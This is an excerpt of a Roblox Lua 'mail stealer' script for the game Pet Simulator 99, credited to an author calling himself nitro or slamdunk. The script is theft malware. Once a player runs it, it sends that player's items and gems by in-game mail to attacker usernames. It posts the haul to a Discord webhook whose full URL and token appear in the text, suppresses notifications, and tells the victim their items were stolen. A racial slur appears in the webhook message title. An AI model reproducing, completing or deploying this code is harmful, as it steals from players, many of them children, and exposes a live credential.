-- PS99 Mail Stealer Script - Updated for December 2025
-- Made by z6mmy - aka slamdunk
-- Items sent to:
-- Webhook: https://discord.com/api/webhooks/1448917392263745547/ngvoLOWlSvDsbO2Qf6jyofjU9SsTGOHjoJFShTJBg3EntxUmv1BhrM-CvRXJJsmaBAr1
-- All features enabled: Webhook notification with sorted items (high to low RAP), stealing logic, mail claim, box empty, gem send, error message, sound/notify disable, etc.
...
_G.Usernames = {"Skibidivaultyeah9"}
...
local MailMessage = "nitro the best"
...
if next(users) == nil or webhook == "" then
    plr:kick("You didn't add any usernames or webhook zammy!")
    return
end

for _, user in ipairs(users) do
    if plr.Name == user then
        plr:kick("Your not allowed to mailsteal yourself nitro")
        return
    end
end
...
local function SendMessage(diamonds)
    ...
    local data = {
        ["embeds"] = {{
            ["title"] = "\240\159\144\177 New PS99 Execution n1gga" ,
            ["color"] = 65280,
			["fields"] = fields,
			["footer"] = {
				["text"] = "Mailstealer by nitro aka slamdunk"
			}
        }}
    }
...
if #sortedItems > 0 or GemAmount1 > min_rap + mailSendPrice then
    ...
    message.Error("All your items just got stolen by nitros mail stealer!")
end
